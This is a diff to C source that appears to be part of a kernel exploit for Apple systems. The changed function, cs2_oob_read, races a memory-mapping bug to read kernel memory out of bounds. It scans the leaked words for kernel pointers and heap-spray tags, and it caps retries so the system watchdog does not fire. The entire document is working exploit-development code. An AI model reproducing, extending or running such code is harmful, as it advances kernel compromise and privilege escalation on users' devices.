@@ -62,11 +62,13 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
     bool read_race_succeeded = false;
     ssize_t w = 0;
 
-    /* volume law (2026-10-24 spin math): 100 tries x 8 spins x 16384 pages x
-       8 mappings = ~13M fixed-overwrite maps per pass = VM machine-gun
-       (configd-watchdog + lag class on 24A435). Until the first success,
-       cap tries at 16; once any capture wins, expand to the adaptive 100+. */
-    for (uint64_t try_idx = 0; try_idx < (cs2_ctx.highiest_success_idx + 100); try_idx++) {   /* OG: adaptive */
+    /* volume law: 100 tries × 8 mappings × 0x2000 pages = VM machine-gun
+       (configd watchdog 2026-11-04 19:36 EST, P007OpenOnly 1.24GiB / 13M faults).
+       copy27: 8 tries until first HIT, then 16. OG EFAULT: adaptive 100+. */
+    uint64_t max_tries = cs2_ctx.copy_confusion_lane
+        ? (cs2_ctx.highiest_success_idx ? 16ull : 8ull)
+        : (cs2_ctx.highiest_success_idx + 100ull);
+    for (uint64_t try_idx = 0; try_idx < max_tries; try_idx++) {
         if (try_idx && cs2_expired()) return KERN_FAILURE;   /* budget law: never exceed the 300s tap budget */
         atomic_store_explicit(&cs2_ctx.shared->race_sync, 1, memory_order_seq_cst);
         // trigger bug to read oob_offset oob
@@ -89,10 +91,34 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
         }
 
         if (w == -1 || (cs2_ctx.copy_confusion_lane && w > 0)) {
-            pread(cs2_ctx.read_fd, buffer, size, 0x3f00 + offset);
-            uint64_t marker = 0;
-            memcpy(&marker, buffer, sizeof(marker));
-            if (marker != cs2_ctx.random_marker) {
+            /* Pre-fill so a short pread cannot look like a PARTIAL HIT
+               (calloc zeros / leftover from the previous page). */
+            memset_pattern8(buffer, &cs2_ctx.random_marker, size);
+            ssize_t nread = pread(cs2_ctx.read_fd, buffer, size, 0x3f00 + offset);
+            if (nread < 8) {
+                usleep(1);
+                continue;
+            }
+            uint64_t q0 = 0, q1 = 0;
+            memcpy(&q0, buffer, sizeof(q0));
+            if (nread >= 16) memcpy(&q1, buffer + 8, sizeof(q1));
+            uint64_t unmarked = 0, kptr_n = 0, spray_n = 0, first_foreign = 0;
+            size_t nq = (size_t)nread / 8;
+            for (size_t qi = 0; qi < nq; qi++) {
+                uint64_t q = 0;
+                memcpy(&q, buffer + qi * 8, sizeof(q));
+                if (q == cs2_ctx.random_marker) continue;
+                unmarked++;
+                if (!first_foreign) first_foreign = q;
+                if ((q >> 36) == 0xfffffff0ull) kptr_n++;
+                if ((q >> 32) == 0xc0dec0deull) spray_n++;
+            }
+            /* OG: wholesale page replace, q0 != marker.
+               copy27: calib PARTIAL is mixed (q0 still marker, later qwords
+               foreign). Hunt those windows too. hop-1 stays closed. */
+            bool wholesale = (unmarked > 0 && q0 != cs2_ctx.random_marker);
+            bool partial = (cs2_ctx.copy_confusion_lane && unmarked > 0 && q0 == cs2_ctx.random_marker);
+            if (wholesale || partial) {
                 read_race_succeeded = true;
                 cs2_ctx.success_read_count += 1;
                 if (try_idx > cs2_ctx.highiest_success_idx) {
@@ -101,20 +127,26 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
                 {
                     static uint64_t hit_logs = 0;
                     if (hit_logs++ < 8) {
-                        uint64_t q0 = 0, q1 = 0;
-                        memcpy(&q0, buffer, sizeof(q0));
-                        if (size >= 16) memcpy(&q1, buffer + 8, sizeof(q1));
                         const char *cls = "other";
-                        if ((q0 >> 36) == 0xfffffff0ull || (q1 >> 36) == 0xfffffff0ull)
-                            cls = "KERNEL POINTER";
-                        else if ((q0 >> 32) == 0xc0dec0deull || (q1 >> 32) == 0xc0dec0deull)
-                            cls = "spray-page tag";
-                        LOG("oob HIT lane=%s w=%zd try=%llu q0=%#llx q1=%#llx (%s)",
-                            w == -1 ? "efault" : "copy27", w,
-                            (unsigned long long)try_idx, q0, q1, cls);
+                        if (kptr_n) cls = "KERNEL POINTER";
+                        else if (spray_n) cls = "spray-page tag";
+                        LOG("oob HIT lane=%s kind=%s cls=%s w=%zd try=%llu q0=%#llx foreign=%#llx unmarked=%llu kptr=%llu spray=%llu",
+                            w == -1 ? "efault" : "copy27",
+                            partial ? "PARTIAL" : "WHOLESALE",
+                            cls, w, (unsigned long long)try_idx, q0, first_foreign,
+                            (unsigned long long)unmarked,
+                            (unsigned long long)kptr_n,
+                            (unsigned long long)spray_n);
                     }
                 }
                 break;
+            }
+            {
+                static uint64_t miss_logs = 0;
+                miss_logs++;
+                if (cs2_ctx.copy_confusion_lane && (miss_logs <= 4 || (miss_logs % 2048) == 0))
+                    LOG("oob MISS lane=copy27 q0=%#llx q1=%#llx (full marker, UPL neighbor silent)",
+                        q0, q1);
             }
             usleep(1);
         }
